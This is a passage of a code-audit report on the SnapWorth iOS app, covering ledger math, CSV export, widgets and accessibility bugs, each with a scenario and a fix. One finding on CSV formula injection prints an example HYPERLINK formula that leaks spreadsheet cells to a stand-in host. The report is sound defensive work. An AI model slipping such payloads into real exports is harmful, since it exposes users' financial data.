**What happens.** Tapping through the four condition chips in ResultView calls `refreshWidget()` four times within a second (ResultView.swift:292), producing four main-actor fetches of the entire library 600 ms later, four rewrites of the app-group blob, four `reloadAllTimelines()` calls and four Live Activity updates for one net change. On the 2,000-scan library AUDIT-v2 sizes at ~1 GB, that is four redundant full fetches back-to-back on the main actor; the repeated `reloadAllTimelines()` also spends the widget's refresh budget, which is what later makes a genuinely new scan slow to appear on the Home Screen.

**Fix.** Hold the pending task in a `private static var syncTask: Task<Void, Never>?` on `ScanRepository` (it must be static — the repository is constructed as a local per call site, ScanRepository.swift:108-111) and `syncTask?.cancel()` before starting the new one, so only the last mutation in a burst does the work.

### itemsSold and realizedProfit are computed over different sets, so a sale with no cost basis publishes as "+$0 · 1 item sold"

`ios/SnapWorth/ViewModels/FlipsViewModel.swift:91`

`s.itemsSold = scopedSold.count` counts every sold row (line 91), while `s.realizedProfit = scopedSold.compactMap(\.realizedProfit).reduce(0, +)` (line 92) silently drops rows where `realizedProfit` is nil — `ScanResult.realizedProfit` requires both `soldPrice` and `paidPrice` (ScanResult.swift:296-299). Dropping the profit rather than guessing a cost basis is a deliberate, tested decision (SnapWorthTests/MigrationTests.swift:565-570), but pairing that total with a count taken over the larger set is not. In the list the gap is at least visible — the row renders "—" and the accessibility value says "Profit unknown — add what you paid" (FlipsView.swift:322-326, 281) — whereas the header (FlipsView.swift:90-98) and the shareable month card (`renderMonthCard`, lines 147-162) show only the two numbers.

**What happens.** A user sells one item this month for $40 having never entered what they paid (a free find, or just an unfilled field). The ledger header and the card they can post from the toolbar both read "+$0" above "1 item sold", which reads as having sold something for nothing rather than as missing data. With two sales, one of them uncosted, the headline total understates real profit with nothing on screen to say so.

**Fix.** Derive the count from the same set as the total (`scopedSold.filter { $0.realizedProfit != nil }.count`) and, when the two differ, show the shortfall explicitly (e.g. "1 sale needs a cost basis"); suppress or annotate the month share card rather than publishing a total that excludes a counted sale.

### summary(_:scope:) applies its scope to only four of seven fields, mixing a month profit with all-time invested capital in one card

`ios/SnapWorth/ViewModels/FlipsViewModel.swift:102`

`summary` takes a `scope` and honours it for `itemsSold`, `realizedProfit`, `averageROI` and `bestFlip` (lines 88-99), but `totalInvested` (lines 102-104), `unrealizedCount` and `unrealizedInvested` (lines 107-109) are computed over `all` regardless of scope. For a free user `scope` is `.month` (FlipsView.swift:21) and the header is literally labelled "Profit this month" (FlipsView.swift:86), with the all-time figure rendered beside it as "Invested" (FlipsView.swift:115).

**What happens.** A free user sells three items in August for $200 profit on $150 of cost basis and sells nothing in September. On 1 September the card reads "Profit this month +$0 / 0 items sold" next to "Invested $150" and "Avg ROI —": $150 of cost basis attributed to sales the same card says did not happen in this period, so the two numbers cannot be reconciled by the user.

**Fix.** Scope `totalInvested` the same way for `.month` (cost basis of items sold in the month plus currently open positions), or label the stat card "Invested (all-time)" so the mixed window is stated rather than implied.

### CSV Profit column has no fixed scale while Paid/Sold/Fees are 2-decimal, and ROI is rounded to whole percent

`ios/SnapWorth/ViewModels/FlipsViewModel.swift:238`

Overload resolution in `csv()` splits the money columns: `paidPrice`, `soldPrice` and `feesEstimate` are `Double?` and hit `decimalString(_ value: Double)` → `String(format: "%.2f")` (lines 234-236), while `realizedProfit` is `Decimal?` and hits `decimalString(_ value: Decimal)` → `NSDecimalNumber(decimal:).stringValue` (lines 238-240), which prints the value's natural scale with no rounding. That Decimal is built by `Decimal(sold) - Decimal(paid) - Decimal(feesEstimate ?? 0)` (ScanResult.swift:298) — the `Decimal(Double)` conversion this repo's own fee table warns "would capture the Double's rounding error" (MarketplaceFees.swift:125-126) — so the cell's scale is whatever that conversion and subtraction produce, not two places. `roiPercentPlain` (lines 242-245) additionally rounds through `Double` to a whole percent.

**What happens.** A row with paid 8.00, sold 65.00, fees 9.00 exports as Paid "8.00", Sold "65.00", Fees "9.00", Profit "48" — the profit column is the one figure in the ledger an accountant reconciles, and it is the only money column with no guaranteed cent scale; with non-round inputs it can carry more than two decimals from the Double→Decimal conversion. ROI 0.4249 exports as "42%", so per-row ROI cannot be recomputed from the exported columns.

**Fix.** Round and format every money column through one helper — e.g. `NSDecimalNumber(decimal: value).rounding(accordingToBehavior: NSDecimalNumberHandler(roundingMode: .plain, scale: 2, ...))` with a POSIX `NumberFormatter` set to 2 fraction digits — and export ROI as a plain fraction at 4 decimals (or percent with 2) rather than a rounded integer.

### CSV export does not neutralize leading formula characters, so an item name can execute in Excel/Numbers

`ios/SnapWorth/ViewModels/FlipsViewModel.swift:265`

`csvEscape` (lines 265-270) implements RFC-4180 quoting only: it wraps and doubles quotes for fields containing a comma, quote or newline, and leaves the field's first character alone. The `Item` column is `r.itemName` (line 183), which is model-generated from whatever text is visible in the photographed item or label, and is user-editable. A field whose first character is `=`, `+`, `-` or `@` is evaluated as a formula by Excel, Numbers and LibreOffice on open, and RFC quoting does not prevent it — the quotes are stripped during import.

**What happens.** An item whose name comes back as `=HYPERLINK("http://x/?"&A2,"click")` (or `=cmd|...`) exports into the Item column verbatim; when the Pro user opens their bookkeeping CSV the cell evaluates, exfiltrating the adjacent profit cells or prompting for external content. The export is also the one file in the product a user is likely to forward to an accountant.

**Fix.** In `csvEscape`, prefix any field whose first character is `=`, `+`, `-`, `@`, tab or CR with a single quote (or a leading space) before applying the existing quoting, and quote unconditionally in that case.

### SettingsViewModel.openSettings() is dead, and both live callers duplicate it inline

`ios/SnapWorth/ViewModels/SettingsViewModel.swift:24`

`openSettings()` is called from nowhere (grep over ios/ for `openSettings`: this definition only). The two places that actually need it build the same URL by hand instead: NotificationSettingsView.swift:27-29 and ScanView.swift:375. This is the same defect class the previous audit closed on this exact file — docs/AUDIT-2026-09-11.md:99-103 deleted `SettingsViewModel.sendFeedback()` for being dead and carrying a second copy of a string the app already had elsewhere.

**What happens.** No runtime symptom; it is a third copy of the iOS-Settings deep link that nobody exercises, so it can rot (or be 'fixed' in isolation) without anything changing on screen — precisely what happened to the duplicated support address in docs/AUDIT-2026-09-11.md:92-97.

**Fix.** Either delete lines 24-27, or keep it as the single owner of the deep link and have NotificationSettingsView.swift:27 and ScanView.swift:375 call it.

### Correcting the shop price after saving to the ledger leaves the saved row holding the old paid price with no way to update it

`ios/SnapWorth/ViewModels/ThriftFlipViewModel.swift:161`

`didSaveToLedger` is set on a successful write (line 161) and is only cleared by `reset()` (line 173). The view gates the save button on `!vm.didSaveToLedger` (ThriftFlipView.swift:124), so once the row is written the button is gone for the rest of the session, while `shelfPriceText` stays freely editable and `calculation` keeps recomputing from it. Nothing re-writes `result.paidPrice` after the first save.

**What happens.** Save a flip with an OCR'd shop price of $8, then notice the tag actually said $18 and correct the field. The verdict updates (and may flip to "Skip it"), but the persisted ledger row keeps `paidPrice = 8`; the save button does not come back, and there is no indication the stored row is now stale, so realized profit for that item is overstated by $10.

**Fix.** Either clear `didSaveToLedger` whenever `shelfPriceText` changes (so the button returns and the row can be re-saved), or, since `scanResult` is the same context-managed object after insert, keep it in sync by re-assigning `result.paidPrice` when the field changes after a save.

### A Thrift Flip scan is charged against the daily free-scan allowance but the ScanResult is discarded unless the flip is Pro, profitable and saved

`ios/SnapWorth/ViewModels/ThriftFlipViewModel.swift:77`

`scanItem` spends the shared allowance on a successful scan — `FreeScanCounter.increment()` (line 77) plus the server count (lines 84-86) — but the `ScanResult` it builds (lines 58-72) is only ever persisted inside `saveToLedger` (line 155), which the UI reaches only when `isPro && calc.isProfitable && !didSaveToLedger` (ThriftFlipView.swift:124). `ScanViewModel.startScan` persists every scan it charges for (ScanViewModel.swift:106). So the object — item name, valuation, condition, stored image — is dropped on `reset()` or sheet dismissal.

**What happens.** A free user scans three items in Thrift Flip: the allowance is exhausted (the Scan tab shows 0 left and the next scan 402s), and My Finds is empty — there is no record of any of the three items or their valuations. Same for a Pro user on any "Skip it" verdict.

**Fix.** Persist the result on a successful Thrift Flip scan the way `ScanViewModel.startScan` does (`try repository.save(result)`, surfacing a non-blocking failure), and let `saveToLedger` promote the already-saved row to `.owned` with its paid price instead of being the only write path.

### The monthly profit bars are not a combined element — six months read as twelve orphaned fragments

`ios/SnapWorth/Views/FlipsView.swift:182`

`monthRow` (lines 182-200) has no `.accessibilityElement(children: .combine)` and no label, so VoiceOver stops separately on the month ("Jul") and the amount ("+$120"), with an unlabeled `Capsule` bar between them contributing the magnitude to nobody. `monthlyCard` (line 163) adds no grouping either. Every other row in the app is combined and labelled as one sentence: `itemRow` at line 265-267, `statusBadge` at 311, `categoryRow` at HistoryView.swift:642-643 ("one spoken sentence per row... rather than five fragments VoiceOver reads out of context"), and the price ladder at ResultView.swift:1259-1260.

**What happens.** With VoiceOver on, swipe through "Last 6 months" on My Flips: twelve stops, with the month and its figure separated and no indication which pairs with which if a month's row happens to be empty.

**Fix.** Add `.accessibilityElement(children: .combine)` plus `.accessibilityLabel("\(bucket.label), \(vm.signedMoney(bucket.profit))")` to the row at line 200, matching `categoryRow`. Mark the `GeometryReader` bar `.accessibilityHidden(true)` since the figure carries its value.

### ForEach over notableFinds can hit duplicate IDs because the backend concatenates each day's finds without dedup

`ios/SnapWorth/Views/HistoryView.swift:575`

`NotableFind.id` is `"\(name)-\(low)-\(high)"` (ListingService.swift:291). The server builds `notable_finds` from `finds`, which `_tallies` (backend/notify.py:2668-2670) accumulates by appending each of the 7 day-documents' find lists with no dedup, and the emitted fields are the truncated name plus **rounded** low/high (backend/notify.py:2729-2734). Two days on which the same item topped the chart therefore yield two entries with byte-identical name and identical rounded bounds, i.e. the same `id`. `ForEach(trends.notableFinds.prefix(3))` at line 575 is an ID-keyed ForEach over that list.

**What happens.** A "Le Creuset Dutch Oven 5.5qt" is the best find on both Tuesday and Friday with the same rounded low/high. The server returns it twice inside `TRENDS_FINDS = 5`; both copies land in `.prefix(3)`. SwiftUI logs "ForEach<…>: the ID … occurs multiple times within the collection, this will give undefined results" and renders the duplicated row unreliably — a Pro user sees two identical "Notable finds" rows or a dropped/flickering one.

**Fix.** Either give the row a positionally stable identity — `ForEach(Array(trends.notableFinds.prefix(3).enumerated()), id: \.offset)` at HistoryView.swift:575 — or, better, dedup at the source in `backend/notify.py:2729-2734` by keying on `(n, c, lo, hi)` before slicing to `TRENDS_FINDS`, since a repeated find also wastes one of only five slots.

### No heading trait anywhere in the Privacy Policy or Terms, so VoiceOver's Headings rotor is empty in both documents

`ios/SnapWorth/Views/LegalView.swift:151`

`LegalSection` renders its heading as a plain `Text` at `dmSans(15, weight: .semibold)` (lines 151-153) with no `.accessibilityAddTraits(.isHeader)`, and `LegalDocumentView` (line 121) adds none either. `PrivacyPolicy.sections` has eight sections and `TermsOfServiceView` six, totalling roughly a thousand words of continuous prose. Both are reachable from the paywall (PaywallView.swift:179/185) and from Settings (SettingsView.swift:58-67). The trait is used correctly elsewhere in the app — ScanView.swift:56 and :372, ResultView.swift:592, PaywallView.swift:38 — so this is an omission, not a convention.

**What happens.** With VoiceOver on, open Privacy Policy from the paywall and set the rotor to Headings: nothing is found, so a user looking for "Service Providers" or "Data Retention" must swipe linearly through every paragraph of the document.

**Fix.** Add `.accessibilityAddTraits(.isHeader)` to the heading `Text` at line 153. One line covers both documents, since both are built from `LegalSection`.

### The guess verdict scores against unrounded bounds while the range is displayed rounded to whole dollars, producing "$0 under the low end"

`ios/SnapWorth/Views/ResultView.swift:641`

`quickVerdict` passes `result.displayValueLow/High` — condition-scaled `Decimal→Double` values with fractional cents — to `GuessScoring.verdict` (ShareCardView.swift:366-375), which compares exactly and then formats the shortfall through `money(value.rounded())` (ShareCardView.swift:391-393). The range the user actually sees is rendered by `ValueRangeView` through `NumberFormatter.snapCurrency`, which has `maximumFractionDigits = 0` (DesignSystem.swift:254). So the number on screen and the number being compared against differ by up to 50 cents, and the reported difference is rounded to the nearest dollar.

**What happens.** AI low 13.00 with the user's condition set to Like New gives `displayValueLow == 14.95`, displayed as "$15". A user who guessed 15 is scored 15 < 14.95 → false, so the card reads "$0 under the low end." — the app tells them they are $0 away from a range whose printed low end is the exact number they typed. Any scaled bound whose fraction is above .5 reproduces it (the multipliers 1.35 / 1.15 / 0.78 produce fractional bounds from almost any base).

**Fix.** Score against the same values that are displayed: pass `result.displayValueLow.rounded()` / `.rounded()` (or round inside `GuessScoring.verdict` before both the containment test and the difference), so the verdict and the printed range can never disagree, and a difference that rounds to zero reads as inside the range.

### The guess verdict is re-scored live, so a condition correction or a tag re-read silently re-grades a guess the user already made

`ios/SnapWorth/Views/ResultView.swift:639`

`quickVerdict` is a computed property over the current `result.displayValueLow/High` (lines 639-643), not a value captured at reveal time. Both of the things that legitimately move the range after the reveal therefore rewrite the verdict: `conditionChip` (line 282) and `rescan`, which replaces `valueLow`/`valueHigh` via `applySharpened` and sets `priceRevealed = true` (lines 838-839). The guess itself was entered once, before the reveal, against the estimate as it stood then — there is no state holding that range.

**What happens.** Guess-first is on. The user guesses $80, taps "Reveal the estimate" on a $70–$90 range and reads "Spot on — your guess is inside the estimate." They then correct the condition to "Used": the line under the range changes to "$10 over the high end." The same thing happens after "Add the tag" returns a sharpened range. The app appears to retract a verdict it already gave for a guess the user cannot change.

**Fix.** Freeze the scored range when the reveal happens: store `@State private var revealedRange: (low: Double, high: Double)?` in `revealPrice()` (line 750) and compute `quickVerdict` from it, leaving the headline range free to move afterwards.

### The generated listing's Copy and Share buttons are about 39pt tall — under 44, and the button directly below them is explicitly 44

`ios/SnapWorth/Views/ResultView.swift:1159`

`secondaryButton` (lines 1150-1165) sets `.padding(.vertical, 11)` around `dmSans(14, weight: .semibold)`, giving roughly 39-40pt of height, and carries no `.snapHitTarget()` and no `minHeight`. The "Regenerate" button 30 lines below uses `.frame(maxWidth: .infinity, minHeight: 44)` (line 1133) and `PrimaryButton` uses `minHeight: 56` (DesignSystem.swift:331), so the 44pt floor is the house standard everywhere in this file except here.

**What happens.** Generate a marketplace listing as a Pro user: the Copy and Share buttons — the two actions that get the listing out of the app — present a ~39pt strike zone, against the 44pt minimum every neighbouring control in the same card respects.

**Fix.** Add `.snapHitTarget()` after `.buttonStyle(.plain)` at line 1164, or raise the vertical padding to 13pt. `snapHitTarget()` is preferable since it leaves the visual size unchanged.

### Live Activity enablement is read inside `body` but never observed, so the control's visibility is only right by accident

`ios/SnapWorth/Views/ScanView.swift:117`

`ThriftRunController.isAvailable` constructs a fresh `ActivityAuthorizationInfo()` each time `body` runs (ThriftRunController.swift:33-35). That type is not `Observable` and publishes nothing SwiftUI tracks, and nothing in the app subscribes to `ActivityAuthorizationInfo().activityEnablementUpdates`. No piece of state changes when the user flips the setting, so there is no invalidation to make the `if` re-evaluate.

**What happens.** A user who previously turned Live Activities off for SnapWorth opens the Scan tab and sees no thrift-run control. They go to Settings → SnapWorth → Live Activities, switch it on, and come back. Nothing in `ScanView` depends on that value, so whether the control appears depends entirely on some unrelated re-render (a scan, a streak change, a tab switch) happening to rebuild `ScanView.body`; until then the feature stays invisible with no way to reach it. The mirror case is worse: revoking permission mid-run removes the control on the next rebuild, taking the only in-app "End run" affordance with it.

**Fix.** Hold enablement in `@State`, seed it in a `.task` from `ActivityAuthorizationInfo().areActivitiesEnabled`, and keep it current by iterating `ActivityAuthorizationInfo().activityEnablementUpdates` in that same task, so the control's visibility is driven by observed state rather than an unobserved read inside `body`.

### A failed history delete is reported in the alert titled 'Restore purchases'

`ios/SnapWorth/Views/SettingsView.swift:196`

The destructive delete handler reuses the restore alert's state — `vm.restoreMessage` (line 196) and `vm.showRestoreAlert` (line 197) — which is presented by the alert declared at line 186 with the fixed title 'Restore purchases'. There is no separate error state for the Data section.

**What happens.** When `ScanRepository.deleteAll` throws (it maps any SwiftData save failure to `AppError.persistence` — ScanRepository.swift:42-48; e.g. the disk is full, or the launch fell back to the in-memory store), the user who tapped 'Delete all' under 'Clear history?' gets an alert headed 'Restore purchases' whose body is a persistence error. The delete silently failed and the message points at the subscription system instead.

**Fix.** Give the Data section its own error state — e.g. `@State private var deleteError: String?` plus an `.alert("Couldn't clear history", isPresented:)` — or make the shared alert carry its title in the view model alongside the message instead of hardcoding 'Restore purchases' at line 186.

### Delete-confirmation copy is unpluralised and is shown even with nothing to delete

`ios/SnapWorth/Views/SettingsView.swift:202`

`Text("This will permanently delete all \(results.count) saved scans.")` interpolates the raw count with a hardcoded plural 's' and no zero case. `results` is the unfiltered `@Query` at line 9, and the row that raises this alert (line 89) is always present. The same file pluralises correctly 150 lines further down (`SubscriptionCard.freeAllowanceText`, line 216: `"\(allowed) free scan\(allowed == 1 ? "" : "s") a day"`), so the standard is set in-repo.

**What happens.** A user with exactly one saved scan taps 'Clear scan history' and reads 'This will permanently delete all 1 saved scans.' On a fresh install, before any scan exists, the destructive row is still offered and reads 'This will permanently delete all 0 saved scans.' — and confirming it runs a delete of nothing that still cancels all ledger notifications and rewrites the widget/Live Activity blobs (ScanRepository.swift:49-55).

**Fix.** Pluralise as the subscription card does — `"...delete all \(results.count) saved scan\(results.count == 1 ? "" : "s")."` — and hide or disable the 'Clear scan history' row (line 89) when `results.isEmpty`.

### Missing-input placeholder always blames the shop price, including when the shop price is filled and the resale price is the blank one

`ios/SnapWorth/Views/ThriftFlipView.swift:248`

`calculation` is nil when *either* `resalePriceText` fails to parse or is <= 0, *or* `shelfPriceText` fails to parse (ThriftFlipViewModel.swift:128-129), but `verdictSection`'s fallback hardcodes "Add the shop price to see your profit." (line 248). The two inputs are not distinguished, so the one instruction shown can be the wrong one.

**What happens.** Scan an item (resale is seeded), scan or type the shop price, then clear the "Expected resale" field to retype it: the verdict card is replaced by "Add the shop price to see your profit." while the shop price sits populated two rows above. Same message if the user zeroes the resale field, in which case following the instruction never produces a verdict.

**Fix.** Branch on which input is missing, e.g. expose the reason from the view model (`shelfPriceText` unparseable -> "Add the shop price…", resale missing or 0 -> "Add the expected resale price…") and render the matching line.

### **[FIXED]** The medium widget prints two money ranges side by side with different dash styles

`ios/SnapWorthWidgets/HaulWidget.swift:153`

`WidgetHaulData.formattedRange` joins with a spaced en dash: `"\(Self.money(totalLow)) – \(Self.money(totalHigh))"` (SnapWorthWidgets.swift:74). `haul.lastItemRange` and every `WidgetFind.range` come from `ScanResult.formattedRange`, which joins with an unspaced en dash: `return "\(lo)–\(hi)"` (ScanResult.swift:215), copied verbatim into the blob at WidgetDataStore.swift:324 and 293.

Both render inside `HaulWidgetMediumView` a few points apart — the total at line 120 and the last item's range at line 153. `compactRange` (SnapWorthWidgets.swift:177) is unspaced, and the gallery placeholder is hand-written spaced ("$60 – $95", HaulWidget.swift:35 and 39-42), so the preview does not match what real data renders. This is the same drift class the shared-block header comment at SnapWorthWidgets.swift:16-20 says the byte-for-byte CI check exists to prevent, and it sits outside what that check can catch because the two formatters live in different types.

**What happens.** A user with a three-item library opens the Home Screen: the medium Haul widget shows "$348 – $620" on the left and "$60–$95" on the right, for the same kind of quantity in the same card.

**Fix.** Pick one separator and use it everywhere. Simplest is to make `WidgetHaulData.formattedRange` match the app's canonical `ScanResult.formattedRange` — drop the spaces to `"\(Self.money(totalLow))–\(Self.money(totalHigh))"` in both copies of the shared block — and update the `placeholder` literals in HaulWidget.swift:35 and 39-42 to match, so the gallery previews what ships.

### **[FIXED]** streak is a snapshot too, so the Lock Screen keeps showing a streak the user has already lost

`ios/SnapWorthWidgets/LockScreenWidgets.swift:102`

Same mechanism as the `freeScansRemaining` finding, different surface. `WidgetDataStore.swift:328` stores `ScanStreak.current()` as a literal integer. `ScanStreak.current` is time-dependent: it returns the stored count only if the last scan was today or yesterday and 0 otherwise (ScanViewModel.swift:214-221 in the `ScanStreak` enum, lines 40-47 of that block). The widget never re-derives it — `LockScreenProvider.getTimeline` (LockScreenWidgets.swift:29-36) re-reads the same blob hourly — so a streak that has expired in the app's own accounting keeps rendering on the Lock Screen until `writeHaul` next runs.

Consumers of the frozen value: `LockScreenRectangularView` lines 102-104 (`"\(haul.findsLabel) · \(haul.streak)-day streak"`), and `ScansLeftView` lines 163, 169, 177, 187.

**What happens.** A user with a 5-day streak scans on Monday, then does not scan or open the app again. By Thursday `ScanStreak.current()` would return 0, but the Lock Screen rectangular widget still reads "12 finds · 5-day streak" — and keeps reading it for as long as the app stays closed.

**Fix.** Store the last-scan date rather than the computed count (e.g. `streakCount` plus `streakLastScan: Date`) and have the widget apply the same today-or-yesterday test against the timeline entry's `date` before showing it. Fold this into the same change as the free-scan fix — both are day-scoped values being frozen at write time.

### **[FIXED]** Recent finds header and body disagree: one reads itemCount, the other reads recentFinds

`ios/SnapWorthWidgets/MoreWidgets.swift:56`

The header's total is gated on `haul.hasScans`, i.e. `itemCount > 0` (line 56, with `formattedRange` at line 57), while the body's empty state is gated on `haul.recentFinds.isEmpty` (line 64). Those are two different fields and they are not written by the same generation of the app: `itemCount` is a v1 field, `recentFinds` a v2 field added in 1.4.0 (SnapWorthWidgets.swift:40-61), and the decoder gives the v2 field an empty default (`recentFinds = try c.decodeIfPresent([WidgetFind].self, forKey: .recentFinds) ?? []`, SnapWorthWidgets.swift:134) while `itemCount` decodes from the old blob intact (line 127).

**What happens.** A user updates from 1.3.x and adds the "Recent finds" widget from the gallery before reopening the app. The v1 blob has `itemCount: 12, totalLow: 348, totalHigh: 620` but no `recentFinds`. The widget renders "Recent finds  $348 – $620" in the header and "Nothing scanned yet" in the body at the same time.

**Fix.** Drive both from the same field. Gate the header total on `!haul.recentFinds.isEmpty` (or show the empty state whenever `recentFinds` is empty regardless of `itemCount`), so the widget cannot simultaneously report a total and claim nothing has been scanned.

### Recent finds header prints the whole-library total above at most four rows

`ios/SnapWorthWidgets/MoreWidgets.swift:61`

The header renders `haul.formattedRange` (line 61) — the sum over all `itemCount` items in the library — immediately to the right of the title "Recent finds" and directly above the row list, which is capped at 2 on `.systemMedium` and 4 on `.systemLarge` (`rowCount`, lines 42-45). Nothing on screen scopes the figure, so the one money number in the header reads as the total of the rows beneath it. The newly added v1 fallback makes it starker: `recentRows(limit:)` (ios/SnapWorth/Services/WidgetDataStore.swift:215) draws a single row from `lastItemName`/`lastItemRange` when `recentFinds` is empty, so a blob from a 1.3.x install shows exactly one $60-$95 row under a full-library header figure.

**What happens.** A 40-item library on the medium family shows two rows ("Levi's 501  $40–$70", "Nike Air Max  $55–$85") under a header reading "$3,480 – $6,200". The rows visibly sum to a few hundred dollars, so the header looks like an arithmetic error in the user's own ledger.

**Fix.** Either scope the header explicitly (a "Total" / "All finds" caption, or move the figure to the footer of the large family where the item count can sit beside it), or drop it from this widget — the Haul widget and both Lock Screen families already carry the library total, and the per-row ranges are the reason to install this one.

### **[FIXED]** Quick Scan widget says "1 items in your haul"

`ios/SnapWorthWidgets/QuickScanWidget.swift:75`

Line 75 interpolates the count into a hardcoded plural: `Text("\(entry.itemCount) items in your haul")`. The branch it sits in is `if entry.itemCount > 0` (line 74), so `itemCount == 1` reaches it and renders "1 items in your haul". Every other count in the bundle pluralizes correctly — `HaulWidgetSmallView` line 82 (`"item\(haul.itemCount == 1 ? "" : "s")"`), `HaulWidgetMediumView` line 126, `findsLabel` (SnapWorthWidgets.swift:181-183) — so this is the one that was missed.

**What happens.** A brand-new user completes their first scan. 600 ms later `scheduleWidgetSync` writes `itemCount: 1` and reloads the timelines, and the Quick Scan widget reads "1 items in your haul" — on the very first impression the widget ever makes.

**Fix.** `Text("\(entry.itemCount) item\(entry.itemCount == 1 ? "" : "s") in your haul")`, matching the pattern already used at HaulWidget.swift:82 and 126.

### **[FIXED]** `compactMoney` puts the dollar sign before the minus, rendering a loss as "$-1.2K"

`ios/SnapWorthWidgets/SnapWorthWidgets.swift:163`

`compactMoney` (lines 163-171) builds its output as `"$\(Int(dollars))"` and `"$\(String(format: "%.1f", thousands))K"`, prefixing the sign-carrying number with "$". The `abs()` guards on lines 165 and 168 show negatives were anticipated, but the output string is malformed for them. `MonthProfitView` is the negative-value consumer and explicitly expects losses — `colour` branches on `profit < 0` at MoreWidgets.swift:268 — and calls `compactMoney(profit)` at lines 263 and 284. The app's own convention is the opposite order: `FlipsViewModel.signedMoney` (ios/SnapWorth/ViewModels/FlipsViewModel.swift:216-220) produces "−$420", as does `ShareCardView.swift:240-254`. The existing tests (SnapWorthTests.swift:946-978) cover only non-negative values. Latent behind the `isPro` defect above, since `monthProfit` is currently always nil; `compactTotal`/`compactRange` only ever see non-negative price sums.

**What happens.** Once entitlement is wired up, a Pro user whose month-to-date `realizedProfit` sums to -$420 sees "$-420" on the "Profit this month" widget, and one at -$1,240 sees "$-1.2K" — the same figure the Flips screen renders as "−$420". VoiceOver reads out the same malformed string via `spoken` (MoreWidgets.swift:284).

**Fix.** Format the magnitude, then prefix the sign: `let sign = dollars < 0 ? "−" : ""` and return `sign + "$" + …`, computing the branches on `abs(dollars)` as they already do. This block is byte-compare-checked against the app copy by the "Widget model is in sync" CI step, so the identical change must land in ios/SnapWorth/Services/WidgetDataStore.swift:161-172. Extend SnapWorthTests.swift:946 with negative cases (-420 → "−$420", -1240 → "−$1.2K").

### **[FIXED]** Tapping the thrift-run Live Activity on the Lock Screen does not deep-link; the Dynamic Island does

`ios/SnapWorthWidgets/SnapWorthWidgetsLiveActivity.swift:16`

`.widgetURL(URL(string: "snapworth://scan"))` is applied only to the `DynamicIsland` builder result (line 59). The Lock Screen / banner presentation — `ThriftRunLockScreenView` constructed at lines 16-19 — carries `activityBackgroundTint` and `activitySystemActionForegroundColor` but no `widgetURL`, so a tap there launches the app with no URL and `SnapWorthApp.handleWidgetURL` (SnapWorthApp.swift:113-126) never runs. The user lands on whatever tab was last selected instead of the camera. Every other surface in the bundle deep-links: HaulWidget.swift:206, QuickScanWidget.swift:99, LockScreenWidgets.swift:126, MoreWidgets.swift:102, 202, 295.

**What happens.** A user is mid-run in a shop with the phone locked. They tap the thrift-run Live Activity on the Lock Screen expecting the camera — the one action the whole feature exists to speed up — and get the app's last-used tab, having to navigate to Scan by hand.

**Fix.** Add `.widgetURL(URL(string: "snapworth://scan"))` to `ThriftRunLockScreenView` in the `ActivityConfiguration` content closure (line 16-19), alongside the existing tint modifiers, so both presentations route through the same deep link.

### The Live Activity's authored label drops the elapsed timer, the one datum VoiceOver cannot recover

`ios/SnapWorthWidgets/SnapWorthWidgetsLiveActivity.swift:120`

`ThriftRunLockScreenView` applies `.accessibilityElement(children: .combine)` at line 119 and then `.accessibilityLabel(...)` at line 120, which replaces the synthesised label outright. The authored string covers the finds count and the range but not `Text(startedAt, style: .timer)` at line 106 or its 'elapsed' caption at line 112, so the running duration — one of the three numbers on the banner, and the one the comment at lines 103-104 explains is there on purpose — is never announced. There is no comment saying the omission is intentional, and a live-updating timer inside a combined element also needs `.accessibilityAddTraits(.updatesFrequently)` to be usable by VoiceOver.

**What happens.** VoiceOver user forty minutes into a thrift run focuses the Live Activity on their Lock Screen. They hear 'Thrift run, 6 finds, worth $120–$240' and nothing about how long they have been in the shop, on the one surface built to answer 'what have I found since I walked in'. Re-focusing never announces it because the label is static text that omits the timer entirely.

**Fix.** Extend the label at lines 120-122 to name the duration, e.g. append `", running " + Self.spokenElapsed(since: startedAt)` computed from `startedAt`, and add `.accessibilityAddTraits(.updatesFrequently)` to the combined element so VoiceOver re-reads it. Alternatively give the timer VStack (lines 105-115) its own `.accessibilityElement` with `.accessibilityLabel("Elapsed")` instead of folding it into the combined element.
